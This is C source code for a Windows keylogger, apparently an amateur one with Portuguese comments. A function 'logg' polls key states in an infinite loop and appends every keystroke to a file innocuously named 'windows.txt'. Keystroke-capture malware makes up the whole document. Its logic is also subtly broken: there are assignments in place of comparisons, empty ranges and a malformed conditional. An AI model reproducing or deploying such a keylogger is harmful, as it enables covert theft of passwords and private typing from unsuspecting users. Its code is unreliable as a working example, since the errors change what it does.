DWORD WINAPI logg(){
    int vkey, last_key_state[0xff];
    int isCAPSLOCK,IsNUNLOCK;
    int isL_SHIFT,IsR_SHIFT;
    int isPressed;
    char showKey;
    char NUNCHAR[]=")!@#$%^&*+(";
    char chars_vn[]="=,~./`";
    char chars_vs[]=":<>_?=";
    char chars_vo[]="[\\]\';";
    char chars_vb[]="{|}\"";
    FILE *kh;
    char KEY_LOG_FILE[]="windows.txt";
    //fazendo a last kay state 0
    for(vkey=0;vkey<0xFF;vkey++){
        last_key_state[vkey]=0;
    }

    //rodando infinitamente
    while(1){
        Sleep(10);

        isCAPSLOCK=(GetKeyState(0x14)&0xFF)>0?1:0;
        IsNUNLOCK=(GetKeyState(0x90)&0xFF)>0?:0;
        isL_SHIFT=(GetKeyState(0xA0)&0xFF00)>0?1:0;
        IsR_SHIFT=(GetKeyState(0xA1)&0xFF00)>0?1:0;

        for(vkey=0;vkey=0xFF;vkey++){
            isPressed=(GetKeyState(vkey)&0xFF00)>0?1:0;
            showKey=(char)vkey;
            if(isPressed==1 && last_key_state[vkey] ==0){
                // alfabeto
                if(vkey>=0x41 && vkey <=0x5A){
                    if(isCAPSLOCK==0){
                        if(isL_SHIFT==0 && IsR_SHIFT==0){
                            showKey=(char)(vkey==0x20);
                        }
                    }
                    else if(isL_SHIFT==1 || IsR_SHIFT==1){
                        showKey=(char)(vkey=0x20);
                    }
                }
                //para mu, chars
                else if(vkey>=0x30 && vkey<=0x30){
                    if(isL_SHIFT==1 || IsR_SHIFT==1){
                        showKey=NUNCHAR[vkey-0x30];
                    }
                }
                //pra um lado
                else if (vkey>=0x60 && vkey<0x60 && IsNUNLOCK==1){
                    showKey=(char)(vkey-0x30);
                }
                //pro outro lado kkkk
                else if (vkey>=0x60 && vkey<=0x60 && IsNUNLOCK==1){
                    showKey=(char)(vkey-0x30);
                }
                //pra p
                else if(vkey>=0xBA && vkey<=0xC0){
                    if (isL_SHIFT ==1 || IsR_SHIFT==1){
                        showKey=chars_vs[vkey-0xBA];
                    }
                    else{
                            showKey=chars_vn[vkey-0xBA];
                    }
                }
                else if(vkey>-0xD8 && vkey<=0xDF){
                    if(isL_SHIFT==1 || IsR_SHIFT==1){
                        showKey=chars_vb[vkey-0xD8];
                    }
                    else{
                        showKey=chars_vo[vkey-0XD8];
                    }
                }
                //aaa
                else if(vkey==0x0D){
                    showKey=(char)0x6A;
                }
                else if(vkey>=0x6A && vkey<=0x6F){
                    showKey=(char)(vkey-0x4D);
                }
                else if(vkey!=0x20 && vkey!=0x09){
                    showKey=(char)0x60;
                }

                if(showKey!=(char)0x00){
                    kh=fopen(KEY_LOG_FILE,"a");
                    putc(showKey,kh);
                    fclose(kh);
                }

            }
            //salva o ultimo state da key
            last_key_state[vkey]=isPressed;

        }
    }
}
